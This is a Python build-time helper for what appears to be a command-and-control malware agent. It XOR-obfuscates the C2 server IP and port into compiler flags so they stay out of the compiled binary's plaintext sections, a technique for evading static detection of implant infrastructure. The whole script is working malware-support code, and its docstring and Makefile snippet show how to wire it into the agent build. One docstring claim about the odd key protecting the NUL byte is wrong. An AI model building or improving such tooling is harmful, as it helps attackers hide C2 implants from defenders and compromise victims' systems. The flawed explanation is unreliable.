#!/usr/bin/env python3
"""
gen_c2_obf.py  –  Build-time XOR obfuscation of C2_IP and C2_PORT
==================================================================
Called by the Makefile before compiling the agent:

    python tools/gen_c2_obf.py 10.0.0.1 4444

Outputs a single line of GCC/MSVC -D flags that encode the IP string and
port so they do not appear as plaintext in .rdata or .data:

    -DC2_IP_OBF_BYTES="{0x...,0x...}" -DC2_IP_OBF_LEN=N
    -DC2_IP_OBF_KEY=0xKK -DC2_PORT_OBF=0xXXXX

Algorithm
---------
* IP  : each byte of (ip + NUL) is XORed with a single-byte key derived
        from the MD5 of the IP string (same derivation as gen_obf.py so
        the approach is consistent across the codebase).  The key is
        always odd and non-zero so no encoded byte equals the key byte
        for a NUL input character.
* Port: XORed with the fixed 16-bit mask 0xBEEF.  Simple and sufficient
        — the port is only 2 bytes and the mask is not in .rdata.

Usage in the Makefile
---------------------
  C2_OBF_FLAGS := $(shell python tools/gen_c2_obf.py $(C2_IP) $(C2_PORT))
  CFLAGS += $(C2_OBF_FLAGS) -DC2_IP="\"$(C2_IP)\"" -DC2_PORT=$(C2_PORT)

The raw C2_IP / C2_PORT defines are still required by the compile-time
guard in config.h.  The *_OBF_* symbols activate the obfuscated decode
path; without them the compile guard in config.h still fires correctly.

Exit codes
----------
  0  — success, flags printed to stdout
  1  — bad arguments (message on stderr)
"""

import sys
import hashlib

_PORT_MASK = 0xBEEF


def _key(s: str) -> int:
    h = int(hashlib.md5(s.encode()).hexdigest()[:4], 16)
    k = ((h * 0x6B) ^ 0xA5) & 0xFF
    return (k | 0x01) & 0xFF   # always odd, never zero


def encode_ip(ip: str):
    k = _key(ip)
    raw = (ip + '\x00').encode('latin-1')
    encoded = [b ^ k for b in raw]
    return k, encoded


def encode_port(port: int) -> int:
    return port ^ _PORT_MASK


def flags(ip: str, port: int) -> str:
    k, enc = encode_ip(ip)
    port_obf = encode_port(port)

    byte_list = ','.join(f'0x{b:02X}' for b in enc)
    # Wrap in braces so the -D value expands to a C brace-initialiser.
    # The quoting must survive both GCC command-line parsing and Make.
    # We output the flags without any shell quoting — the Makefile must
    # wrap the $(shell ...) output appropriately.
    flags_str = (
        f'-DC2_IP_OBF_BYTES="{{{byte_list}}}"'
        f' -DC2_IP_OBF_LEN={len(enc)}'
        f' -DC2_IP_OBF_KEY=0x{k:02X}'
        f' -DC2_PORT_OBF=0x{port_obf:04X}'
    )
    return flags_str


def main():
    if len(sys.argv) not in (2, 3):
        print(f'Usage: {sys.argv[0]} <ip> [port]', file=sys.stderr)
        sys.exit(1)

    ip   = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) == 3 else 50005

    print(flags(ip, port))


if __name__ == '__main__':
    main()
